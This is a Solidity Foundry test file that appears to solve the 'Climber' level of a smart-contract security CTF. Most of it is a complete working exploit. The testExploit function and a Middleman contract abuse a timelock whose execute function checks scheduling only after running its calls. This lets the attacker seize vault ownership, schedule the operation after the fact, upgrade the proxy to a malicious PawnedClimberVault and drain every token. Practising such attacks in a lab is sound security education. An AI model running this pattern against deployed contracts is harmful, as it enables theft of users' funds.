// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));

        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // Deploy the external contract that will take care of executing the `schedule` function
        Middleman middleman = new Middleman();

        // prepare the operation data composed by 3 different actions
        bytes32 salt = keccak256("attack proposal");
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);

        // set the attacker as the owner of the vault as the first operation
        targets[0] = address(climberVaultProxy);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);

        // grant the PROPOSER role to the middle man contract will schedule the operation
        targets[1] = address(climberTimelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", climberTimelock.PROPOSER_ROLE(), address(middleman));

        // call the external middleman contract to schedule the operation with the needed data
        targets[2] = address(middleman);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)", attacker, address(climberVaultProxy), address(climberTimelock), salt);

        // anyone can call the `execute` function, there's no auth check over there
        vm.prank(attacker);
        climberTimelock.execute(targets, values, dataElements, salt);

        // at this point `attacker` is the owner of the ClimberVault and he can do what ever he wants
        // For example we could upgrade to a new implementation that allow us to do whatever we want
        // Deploy the new implementation
        vm.startPrank(attacker);
        PawnedClimberVault newVaultImpl = new PawnedClimberVault();

        // Upgrade the proxy implementation to the new vault
        ClimberVault(address(climberVaultProxy)).upgradeTo(address(newVaultImpl));

        // withdraw all the funds
        PawnedClimberVault(address(climberVaultProxy)).withdrawAll(address(dvt));
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}

contract Middleman {
  function scheduleOperation(address attacker, address vaultAddress, address vaultTimelockAddress, bytes32 salt) external {
    // Recreate the scheduled operation from the Middle man contract and call the vault
    // to schedule it before it will check (inside the `execute` function) if the operation has been scheduled
    // This is leveraging the existing re-entrancy exploit in `execute`
    ClimberTimelock vaultTimelock = ClimberTimelock(payable(vaultTimelockAddress));
    address[] memory targets = new address[](3);
    uint256[] memory values = new uint256[](3);
    bytes[] memory dataElements = new bytes[](3);
    // set the attacker as the owner
    targets[0] = vaultAddress;
    values[0] = 0;
    dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);
    // set the attacker as the owner
    targets[1] = vaultTimelockAddress;
    values[1] = 0;
    dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", vaultTimelock.PROPOSER_ROLE(), address(this));
    // create the proposal
    targets[2] = address(this);
    values[2] = 0;
    dataElements[2] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)",attacker, vaultAddress, vaultTimelockAddress, salt);
    vaultTimelock.schedule(targets, values, dataElements, salt);
  }
}

contract PawnedClimberVault is ClimberVault {
/// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}
    function withdrawAll(address tokenAddress) external onlyOwner {
        // withdraw the whole token balance from the contract
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
    }
}
